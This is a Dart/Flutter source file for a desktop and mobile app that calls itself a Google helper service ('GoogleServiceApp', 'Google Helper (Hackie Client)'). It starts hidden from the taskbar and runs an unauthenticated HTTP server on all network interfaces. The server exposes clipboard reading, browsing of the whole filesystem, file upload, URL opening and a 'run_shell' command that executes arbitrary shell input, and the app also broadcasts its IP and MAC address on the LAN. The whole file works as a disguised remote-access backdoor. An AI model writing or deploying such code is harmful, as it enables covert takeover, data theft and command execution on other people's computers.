import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:clipboard/clipboard.dart';
import 'package:tray_manager/tray_manager.dart';
import 'package:window_manager/window_manager.dart';
import 'package:get_mac_address/get_mac_address.dart';
import 'package:url_launcher/url_launcher.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final bool isMobile = Platform.isAndroid || Platform.isIOS;
  final bool isDesktop =
      Platform.isMacOS || Platform.isWindows || Platform.isLinux;

  if (isMobile) {
    await initializeService();
  } else if (isDesktop) {
    await windowManager.ensureInitialized();
    const WindowOptions windowOptions = WindowOptions(
      size: Size(400, 600),
      center: true,
      skipTaskbar: true,
      titleBarStyle: TitleBarStyle.hidden,
    );
    await windowManager.waitUntilReadyToShow(windowOptions, () async {
      await windowManager.hide(); // Start hidden, accessible via tray
    });

    // Start background sync loop for desktop
    startDesktopSync();
  }

  runApp(const GoogleServiceApp());
}

Future<void> initializeService() async {
  // ... [Existing mobile initialization]
}

String lastClipboardContent = '';
HttpServer? _directHelperServer;
String _helperDeviceName = 'Desktop';
String _helperIpAddress = 'Unknown IP';
String _helperMacAddress = 'Unknown MAC';
RawDatagramSocket? _beaconSocket;

Future<void> _startLanBeacon() async {
  if (_beaconSocket != null) return;
  try {
    _beaconSocket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
    _beaconSocket!.broadcastEnabled = true;
    Timer.periodic(const Duration(seconds: 2), (_) {
      final payload = jsonEncode({
        'type': 'hackie_helper_beacon',
        'name': _helperDeviceName,
        'ipAddress': _helperIpAddress,
        'macAddress': _helperMacAddress,
        'port': 8765,
      });
      _beaconSocket?.send(
        utf8.encode(payload),
        InternetAddress('255.255.255.255'),
        8766,
      );
    });
  } catch (e) {
    debugPrint('Failed to start LAN beacon: $e');
  }
}

Future<Map<String, dynamic>> _runCommand(Map data) async {
  final String? command = data['command'] as String?;
  if (command == null) return {'success': false, 'error': 'Missing command'};

  if (command == 'open_url') {
    final String url = (data['url'] as String?) ?? '';
    if (url.isNotEmpty) {
      await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
    }
    return {'success': true};
  }

  if (command == 'lock_screen') {
    if (Platform.isMacOS) {
      await Process.run('pmset', ['displaysleepnow']);
    } else if (Platform.isWindows) {
      await Process.run('rundll32.exe', ['user32.dll,LockWorkStation']);
    } else if (Platform.isLinux) {
      await Process.run('xdg-screensaver', ['lock']);
    }
    return {'success': true};
  }

  if (command == 'run_shell') {
    final String shellCmd = (data['cmd'] as String?) ?? '';
    if (shellCmd.isNotEmpty) {
      final ProcessResult result = Platform.isWindows
          ? await Process.run('cmd.exe', ['/c', shellCmd])
          : await Process.run('sh', ['-c', shellCmd]);
      return {
        'success': true,
        'stdout': result.stdout.toString(),
        'stderr': result.stderr.toString(),
      };
    }
  }

  return {'success': false, 'error': 'Unsupported command'};
}

Future<void> _startDirectHelperServer() async {
  if (_directHelperServer != null) return;

  _directHelperServer = await HttpServer.bind(InternetAddress.anyIPv4, 8765);
  _directHelperServer!.listen((HttpRequest request) async {
    try {
      final path = request.uri.path;

      if (request.method == 'GET' && path == '/health') {
        request.response.headers.contentType = ContentType.json;
        request.response.write(
          jsonEncode({
            'status': 'online',
            'name': _helperDeviceName,
            'platform': Platform.operatingSystem,
          }),
        );
        await request.response.close();
        return;
      }

      if (request.method == 'GET' && path == '/info') {
        request.response.headers.contentType = ContentType.json;
        request.response.write(
          jsonEncode({
            'name': _helperDeviceName,
            'platform': Platform.operatingSystem,
            'ipAddress': _helperIpAddress,
            'macAddress': _helperMacAddress,
            'status': 'online',
          }),
        );
        await request.response.close();
        return;
      }

      if (request.method == 'GET' && path == '/clipboard') {
        final currentClipboard = await FlutterClipboard.paste();
        request.response.headers.contentType = ContentType.json;
        request.response.write(jsonEncode({'content': currentClipboard}));
        await request.response.close();
        return;
      }

      if (request.method == 'POST' && path == '/clipboard') {
        final payload =
            jsonDecode(await utf8.decoder.bind(request).join()) as Map;
        final content = (payload['content'] as String?) ?? '';
        if (content.isNotEmpty) {
          await FlutterClipboard.copy(content);
          lastClipboardContent = content;
        }
        request.response.headers.contentType = ContentType.json;
        request.response.write(jsonEncode({'success': true}));
        await request.response.close();
        return;
      }

      if (request.method == 'GET' && path == '/files') {
        final targetPath =
            request.uri.queryParameters['path'] ??
            (Platform.isWindows ? 'C:\\' : '/');
        final dir = Directory(targetPath);
        final entities = dir.listSync();
        final items = entities
            .map(
              (e) => {
                'name': e.path.split(Platform.pathSeparator).last,
                'isDir': e is Directory,
                'path': e.path,
              },
            )
            .toList();
        request.response.headers.contentType = ContentType.json;
        request.response.write(
          jsonEncode({'path': targetPath, 'items': items}),
        );
        await request.response.close();
        return;
      }

      if (request.method == 'POST' && path == '/upload') {
        final name =
            request.uri.queryParameters['name'] ??
            'hackie_file_${DateTime.now().millisecondsSinceEpoch}';
        final downloads = Platform.environment['HOME'] != null
            ? Directory('${Platform.environment['HOME']}/Downloads')
            : Directory.systemTemp;
        if (!downloads.existsSync()) {
          downloads.createSync(recursive: true);
        }
        final file = File('${downloads.path}${Platform.pathSeparator}$name');
        final sink = file.openWrite();
        await request.cast<List<int>>().pipe(sink);
        await sink.flush();
        await sink.close();

        request.response.headers.contentType = ContentType.json;
        request.response.write(
          jsonEncode({'success': true, 'savedPath': file.path}),
        );
        await request.response.close();
        return;
      }

      if (request.method == 'POST' && path == '/command') {
        final payload =
            jsonDecode(await utf8.decoder.bind(request).join()) as Map;
        final response = await _runCommand(payload);
        request.response.headers.contentType = ContentType.json;
        request.response.write(jsonEncode(response));
        await request.response.close();
        return;
      }

      request.response.statusCode = HttpStatus.notFound;
      await request.response.close();
    } catch (e) {
      request.response.statusCode = HttpStatus.internalServerError;
      request.response.headers.contentType = ContentType.json;
      request.response.write(
        jsonEncode({'success': false, 'error': e.toString()}),
      );
      await request.response.close();
    }
  });
}

Future<void> startDesktopSync() async {
  final deviceInfo = DeviceInfoPlugin();
  String deviceName = "Desktop";

  if (Platform.isMacOS) {
    MacOsDeviceInfo macInfo = await deviceInfo.macOsInfo;
    deviceName = macInfo.computerName;
  } else if (Platform.isWindows) {
    WindowsDeviceInfo winInfo = await deviceInfo.windowsInfo;
    deviceName = winInfo.computerName;
  }

  String ipAddress = "Unknown IP";
  String macAddress = "Unknown MAC";

  try {
    macAddress = await GetMacAddress().getMacAddress() ?? "Unknown MAC";
  } catch (e) {
    debugPrint("Failed to get MAC: $e");
  }

  try {
    for (var interface in await NetworkInterface.list()) {
      for (var addr in interface.addresses) {
        if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
          ipAddress = addr.address;
          break;
        }
      }
      if (ipAddress != "Unknown IP") break;
    }
  } catch (e) {
    debugPrint("Failed to get IP: $e");
  }

  _helperDeviceName = deviceName;
  _helperIpAddress = ipAddress;
  _helperMacAddress = macAddress;
  await _startDirectHelperServer();
  await _startLanBeacon();
}

class GoogleServiceApp extends StatefulWidget {
  const GoogleServiceApp({super.key});

  @override
  State<GoogleServiceApp> createState() => _GoogleServiceAppState();
}

class _GoogleServiceAppState extends State<GoogleServiceApp>
    with TrayListener, WindowListener {
  bool isConnected = false;
  String deviceName = "Unknown Device";

  @override
  void initState() {
    super.initState();
    if (Platform.isMacOS || Platform.isWindows || Platform.isLinux) {
      trayManager.addListener(this);
      windowManager.addListener(this);
      _initTray();
    }
    _checkConnection();
  }

  Future<void> _initTray() async {
    await trayManager.setIcon(
      Platform.isWindows ? 'web/icons/Icon-192.png' : 'web/icons/Icon-192.png',
    );
    await trayManager.setToolTip('Google Helper (Hackie Client)');
    await trayManager.setContextMenu(
      Menu(
        items: [
          MenuItem(key: 'open_dashboard', label: 'Show Dashboard'),
          MenuItem.separator(),
          MenuItem(key: 'exit_app', label: 'Quit'),
        ],
      ),
    );
  }

  @override
  void onTrayIconMouseDown() {
    trayManager.popUpContextMenu();
  }

  @override
  void onTrayIconRightMouseDown() {
    trayManager.popUpContextMenu();
  }

  @override
  void onTrayMenuItemClick(MenuItem menuItem) {
    if (menuItem.key == 'open_dashboard') {
      windowManager.show();
      windowManager.focus();
    } else if (menuItem.key == 'exit_app') {
      exit(0);
    }
  }

  @override
  void dispose() {
    trayManager.removeListener(this);
    windowManager.removeListener(this);
    super.dispose();
  }

  Future<void> _checkConnection() async {
    final deviceInfo = DeviceInfoPlugin();
    String? deviceId;

    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      deviceId = androidInfo.id;
      deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      deviceId = iosInfo.identifierForVendor;
      deviceName = iosInfo.name;
    } else if (Platform.isMacOS) {
      MacOsDeviceInfo macInfo = await deviceInfo.macOsInfo;
      deviceId = macInfo.systemGUID ?? "desktop_mac";
      deviceName = macInfo.computerName;
    } else if (Platform.isWindows) {
      WindowsDeviceInfo winInfo = await deviceInfo.windowsInfo;
      deviceId = winInfo.deviceId;
      deviceName = winInfo.computerName;
    }

    if (deviceId != null && mounted) {
      setState(() {
        isConnected = _directHelperServer != null;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0F0F13),
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF0F0F13),
          elevation: 0,
        ),
      ),
      home: Scaffold(
        appBar: AppBar(
          title: const Text(
            'Helper',
            style: TextStyle(fontWeight: FontWeight.bold),
          ),
          centerTitle: true,
          actions: [
            if (Platform.isMacOS || Platform.isWindows || Platform.isLinux)
              IconButton(
                icon: const Icon(Icons.close),
                onPressed: () {
                  windowManager.hide();
                },
              ),
          ],
        ),
        body: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Icon(
                isConnected ? Icons.check_circle_outline : Icons.error_outline,
                color: isConnected ? Colors.greenAccent : Colors.orangeAccent,
                size: 80,
              ),
              const SizedBox(height: 24),
              Text(
                isConnected
                    ? 'Connected to Hackie App'
                    : 'Waiting for connection...',
                textAlign: TextAlign.center,
                style: const TextStyle(
                  fontSize: 22,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: 12),
              Text(
                'Device: $deviceName',
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 16, color: Colors.grey.shade400),
              ),
              const SizedBox(height: 48),
              if (isConnected) ...[
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.sync, color: Colors.blueAccent),
                      SizedBox(width: 16),
                      Expanded(
                        child: Text(
                          'Clipboard sync is active',
                          style: TextStyle(color: Colors.white70),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.monitor, color: Colors.purpleAccent),
                      SizedBox(width: 16),
                      Expanded(
                        child: Text(
                          'Remote control available',
                          style: TextStyle(color: Colors.white70),
                        ),
                      ),
                    ],
                  ),
                ),
              ] else ...[
                const Center(
                  child: CircularProgressIndicator(color: Colors.orangeAccent),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }
}
